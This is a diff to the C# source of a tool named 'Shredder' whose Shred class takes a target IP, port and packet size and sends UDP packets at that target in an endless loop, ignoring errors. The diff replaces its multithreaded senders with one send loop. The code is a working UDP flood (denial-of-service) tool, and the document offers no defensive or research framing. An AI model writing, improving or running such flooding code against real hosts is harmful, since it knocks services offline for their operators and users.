@@ -8,7 +8,6 @@ namespace Shredder
         private string _ip;
         private int _port;
         private int _force; // default: 1250
-        private int _threads; // default: 100
 
         private UdpClient _client;
         private byte[] _data;
@@ -21,12 +20,11 @@ namespace Shredder
         private readonly object _lock = new object();
         private static readonly object _consoleLock = new object();
 
-        public Shred(string ip, int port, int force, int threads)
+        public Shred(string ip, int port, int force)
         {
-            this._ip = ip;
-            this._port = port;
-            this._force = force; // default: 1250
-            this._threads = threads; // default: 100
+            _ip = ip;
+            _port = port;
+            _force = force; // default: 1250
 
             _client = new UdpClient();
             _data = new byte[force];
@@ -36,11 +34,29 @@ namespace Shredder
         {
             _on = true;
             _sent = 0;
-            for (int i = 0; i < _threads; i++)
-            {
-                await Task.Run(SendAsync);
-            }
+
+            await Task.Run(SendLoop);
             await Task.Run(Info);
+        }
+
+        private async Task SendLoop()
+        {
+            while (_on)
+            {
+                try
+                {
+                    IPEndPoint endPoint = (IPEndPoint)GetEndpoint();
+                    await _client.SendAsync(_data, _data.Length, endPoint);
+                    lock (_lock)
+                    {
+                        _sent += _force;
+                    }
+                }
+                catch
+                {
+                    // ignore
+                }
+            }
         }
 
         public void Info()
@@ -87,31 +103,9 @@ namespace Shredder
             }
         }
 
-
-
         public void Stop()
         {
             _on = false;
-        }
-
-        private async Task SendAsync()
-        {
-            while (_on)
-            {
-                try
-                {
-                    IPEndPoint endPoint = (IPEndPoint)GetEndpoint();
-                    await _client.SendAsync(_data, _data.Length, endPoint);
-                    lock (_lock)
-                    {
-                        _sent += _force;
-                    }
-                }
-                catch
-                {
-                    // ignore
-                }
-            }
         }
 
         private string Stage(string text, char symbol = '.')
